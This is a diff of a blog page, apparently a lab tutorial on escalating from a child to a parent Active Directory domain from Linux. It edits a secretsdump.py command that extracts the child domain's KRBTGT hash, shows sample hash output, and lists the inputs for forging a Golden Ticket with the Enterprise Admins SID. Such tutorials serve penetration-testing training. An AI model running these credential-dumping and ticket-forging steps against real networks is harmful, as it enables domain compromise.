@@ -7,7 +7,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/img/trusts-child-parent.png">
 <meta property="article:published_time" content="2025-12-02T22:57:51.000Z">
-<meta property="article:modified_time" content="2025-12-02T23:55:52.647Z">
+<meta property="article:modified_time" content="2025-12-03T00:01:48.792Z">
 <meta property="article:author" content="Twistzz">
 <meta property="article:tag" content="lookupsid">
 <meta property="article:tag" content="secretsdump">
@@ -20,7 +20,7 @@
   "url": "http://example.com/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/",
   "image": "http://example.com/img/trusts-child-parent.png",
   "datePublished": "2025-12-02T22:57:51.000Z",
-  "dateModified": "2025-12-02T23:55:52.647Z",
+  "dateModified": "2025-12-03T00:01:48.792Z",
   "author": [
     {
       "@type": "Person",
@@ -165,7 +165,7 @@
 <blockquote>
 <p>The KRBTGT hash of the child domain ( To Sign the Golden Ticket )<br>The SID of the child domain<br>The FQDN of the child domain.<br>The name of a target user in the child domain (doesn’t need to exist!)<br>The SID of the Enterprise Admins Group of the parent domain.</p>
 </blockquote>
-<h3 id="Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain"><a href="#Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain" class="headerlink" title="Extraction Of KRBTGT Hash Of The Child Domain"></a>Extraction Of KRBTGT Hash Of The Child Domain</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py child-FQDN-domain/our-privileged-user@dc-ip -just-dc-user NETBIOS_DOMAIN/krbtgt</span><br><span class="line"></span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br></pre></td></tr></table></figure>
+<h3 id="Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain"><a href="#Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain" class="headerlink" title="Extraction Of KRBTGT Hash Of The Child Domain"></a>Extraction Of KRBTGT Hash Of The Child Domain</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py child-FQDN-domain/our-privileged-user@child-domain-dc-ip -just-dc-user NETBIOS_DOMAIN/krbtgt</span><br><span class="line"></span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br></pre></td></tr></table></figure>
 
 
 <p>FQDN : <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
